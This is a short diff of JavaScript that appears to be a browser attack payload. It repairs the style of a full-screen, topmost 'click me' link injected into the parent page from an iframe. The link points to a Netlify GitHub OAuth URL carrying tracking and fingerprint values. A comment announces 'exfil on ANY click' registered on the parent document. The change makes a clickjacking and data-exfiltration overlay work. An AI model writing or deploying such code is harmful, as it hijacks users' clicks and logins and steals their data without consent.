@@ -11,8 +11,7 @@
   a.href = 'https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=https%3A%2F%2fwww.netlify.com%2F&use_redirect=true';
   a.target = '_blank';
   a.textContent = 'click me';
-  a.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;background:#fff;color:#000;font-size:48px;cursor:pointer;z-index:2147483647;display:flex;align-items:center;justify-content:center';
-  ;text-decoration:none';
+  a.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;background:#fff;color:#000;font-size:48px;cursor:pointer;z-index:2147483647;display:flex;align-items:center;justify-content:center;text-decoration:none';
   parent.document.body.append(a);
 
   // exfil on ANY click — registered on the PARENT document, so it survives the iframe dying
